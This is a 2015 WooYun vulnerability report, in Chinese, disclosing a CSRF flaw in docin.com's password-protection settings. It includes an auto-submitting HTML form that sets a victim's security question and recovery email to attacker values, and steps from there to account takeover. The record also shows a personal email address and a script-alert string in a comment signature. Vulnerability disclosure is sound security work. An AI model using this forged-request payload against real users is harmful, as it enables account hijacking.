{"id": 26239, "wybug_id": "wooyun-2015-0129208", "wybug_title": "豆丁网某处漏洞可用来重置用户密码", "wybug_corp": "豆丁网", "wybug_author": "苏安泽", "wybug_date": "2015-07-26 21:23", "wybug_open_date": "2015-07-31 21:24", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-31：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 豆丁网某处漏洞可用来重置中招用户的登陆密码 详细说明：     漏洞证明：  \nhttp://www.docin.com/app/my/docin/pwdsale\n在设置密码保护处抓包（默认是没有设置密码保护的），看到没有加上任何的验证，现在我们构造一个表单，代码如下：\n<html>  <body>    <form action=\"http://www.docin.com/app/my/docin/pwdsale?fn=save\" method=\"POST\">      <input type=\"hidden\" name=\"question\" value=\"1\" />      <input type=\"hidden\" name=\"answer\" value=\"hackimg\" />      <input type=\"hidden\" name=\"validateEmail\" value=\"296864045@qq.com\" />    </form><script>document.forms[0].submit();</script></body></html>\n就传了三个参数，一个是密码保护问题的。一个是答案，一个是密码保护邮箱。密码保护邮箱跟绑定的邮箱不一样的！现在我们本地访问一下，效果如下：\n\n现在我们去邮箱看一下，密保问题和答案什么的都放到邮箱去了！\n\n为了实现如果是劫持其他中招的用户，我就换了一个浏览器登陆我的邮箱然后点击验证。\n\n我们可以看到点击验证后直接给我们自动登陆了hackimg这个账号了，现在我们就可以去资料里面看一下他的注册邮箱，然后找回密码。上图可以看到密码的保护问题和答案都发我邮箱了！\n\n现在我们拿到注册邮箱了，找回密码去。下面找回密码的演示就不用截图了，密码保护问题什么都有了，要找回密码也是很容易的。找回密码只需要密码保护问题和注册邮箱就行了！   修复方案：  加上一些验证吧。   版权声明：转载请注明来源 苏安泽@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-31 21:24 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-27 00:28 |    \t\t苏安泽 \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:25        | 敢不敢关注一下，<script>alert('关注成功'...)\t\t \n  看来这个洞是要被忽略的节奏了！只求乌云给的wb了。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}